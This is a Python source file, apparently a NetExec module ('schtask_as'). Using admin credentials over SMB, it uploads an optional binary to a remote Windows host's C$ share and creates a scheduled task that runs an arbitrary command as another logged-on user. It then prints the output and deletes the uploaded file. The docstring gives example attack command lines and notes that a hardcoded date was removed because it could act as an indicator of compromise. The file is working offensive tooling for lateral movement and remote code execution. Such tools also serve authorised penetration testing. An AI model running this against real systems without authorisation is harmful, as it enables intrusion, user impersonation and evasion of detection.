import os
from traceback import format_exc
from nxc.protocols.smb.atexec import TSCH_EXEC


class NXCModule:
    """
    Execute a scheduled task remotely as a already connected user by @Defte_
    Thanks @Shad0wC0ntr0ller for the idea of removing the hardcoded date that could be used as an IOC
    Modified by @Defte_ so that output on multiples lines are printed correctly (28/04/2025)
    Modified by @Defte_ so that we can upload a custom binary to execute using the BINARY option (28/04/2025)
    """

    def options(self, context, module_options):
        r"""
        CMD            Command to execute
        USER           User to execute command as
        BINARY         OPTIONAL: Upload the binary to be executed by CMD
        TASK           OPTIONAL: Set a name for the scheduled task name
        FILE           OPTIONAL: Set a name for the command output file
        LOCATION       OPTIONAL: Set a location for the command output file (e.g. '\tmp\')

        Example:
        -------
        nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD=whoami
        nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD='bin.exe --option' BINARY=bin.exe
        """
        self.command_to_run = self.binary_to_upload = self.run_task_as = self.task_name = self.output_filename = self.output_file_location = self.time = None
        self.share = "C$"
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.tmp_path = self.tmp_dir.split(":")[1]

        if "CMD" in module_options:
            self.command_to_run = module_options["CMD"]

        if "BINARY" in module_options:
            self.binary_to_upload = module_options["BINARY"]

        if "USER" in module_options:
            self.run_task_as = module_options["USER"]

        if "TASK" in module_options:
            self.task_name = module_options["TASK"]

        if "FILE" in module_options:
            self.output_filename = module_options["FILE"]

        if "LOCATION" in module_options:
            self.output_file_location = module_options["LOCATION"]

    name = "schtask_as"
    description = "Remotely execute a scheduled task as a logged on user"
    supported_protocols = ["smb"]

    def on_admin_login(self, context, connection):
        self.logger = context.log

        if self.command_to_run is None:
            self.logger.fail("You need to specify a CMD to run")
            return 1

        if self.run_task_as is None:
            self.logger.fail("You need to specify a USER to run the command as")
            return 1

        if self.binary_to_upload:
            if not os.path.isfile(self.binary_to_upload):
                self.logger.fail(f"Cannot find {self.binary_to_upload}")
                return 1
            else:
                self.logger.display(f"Uploading {self.binary_to_upload}")
                binary_file_location = self.tmp_path if self.output_file_location is None else self.output_file_location
                with open(self.binary_to_upload, "rb") as binary_to_upload:
                    try:
                        self.binary_to_upload_name = os.path.basename(self.binary_to_upload)
                        connection.conn.putFile(self.share, f"{binary_file_location}{self.binary_to_upload_name}", binary_to_upload.read)
                        self.logger.success(f"Binary {self.binary_to_upload_name} successfully uploaded in {binary_file_location}{self.binary_to_upload_name}")
                    except Exception as e:
                        self.logger.fail(f"Error writing file to share {binary_file_location}: {e}")
                        return 1

        self.logger.display("Connecting to the remote Service control endpoint")
        try:
            exec_method = TSCH_EXEC(
                connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
                connection.smb_share_name,
                connection.username,
                connection.password,
                connection.domain,
                connection.kerberos,
                connection.aesKey,
                connection.host,
                connection.kdcHost,
                connection.hash,
                self.logger,
                connection.args.get_output_tries,
                connection.args.share,
                self.run_task_as,
                self.command_to_run,
                self.output_filename,
                self.task_name,
                self.output_file_location,
            )

            self.logger.display(f"Executing {self.command_to_run} as {self.run_task_as}")
            output = exec_method.execute(self.command_to_run, True)

            try:
                if not isinstance(output, str):
                    output = output.decode(connection.args.codec)
            except UnicodeDecodeError:
                # Required to decode specific French characters otherwise it'll print b"<result>"
                output = output.decode("cp437")
            if output:
                for line in output.splitlines():
                    self.logger.highlight(line.rstrip())

        except Exception:
            self.logger.debug("Error executing command via atexec, traceback:")
            self.logger.debug(format_exc())
        finally:
            if self.binary_to_upload:
                try:
                    connection.conn.deleteFile(self.share, f"{binary_file_location}{self.binary_to_upload_name}")
                    context.log.success(f"Binary {binary_file_location}{self.binary_to_upload_name} successfully deleted")
                except Exception as e:
                    context.log.fail(f"Error deleting {binary_file_location}{self.binary_to_upload_name} on {self.share}: {e}")
